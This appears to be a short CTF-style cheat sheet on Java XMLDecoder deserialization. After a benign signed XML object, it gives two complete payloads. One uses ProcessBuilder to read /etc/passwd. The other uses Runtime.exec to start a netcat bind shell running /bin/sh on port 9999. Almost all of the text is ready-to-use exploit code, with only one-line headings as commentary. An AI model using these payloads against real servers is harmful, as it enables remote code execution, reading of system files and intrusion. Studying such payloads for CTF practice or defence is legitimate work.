**Consider the below XML file used to sign on a web application - if we send this file, it gets verified by the server**
```
<java version="1.7.0_111" class="java.beans.XMLDecoder">
  <object class="models.CTFSignature" id="CTFSignature0">
    <void class="models.CTFSignature" method="getField">
    <string>hash</string>
    <void method="set">
      <object idref="CTFSignature0"/>
      <string>50de088cd9458c8b52687d35d8ebc3c19e3ece3b</string>
    </void>
  </void>
  <void class="models.CTFSignature" method="getField">
    <string>sig</string>
    <void method="set">
      <object idref="CTFSignature0"/>
        <string>3feaaad8abb4740d93169bd04757a07af271d8db</string>
      </void>
    </void>
  </object>
</java>
```
**Now, if we build the object to contain commands, we can get execution - there are a couple of ways to do this, ProcessBuilder and Runtime**
### Processbuilder
```
<java version="1.7.0_111" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
   <array class="java.lang.String" length="2">
     <void index="0">
      <string>cat</string>
     </void>
     <void index="1">
      <string>/etc/passwd</string>
     </void>
   </array>
   <void method="start" id="process"></void>
</object>
</java>
```
### Runtime
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```
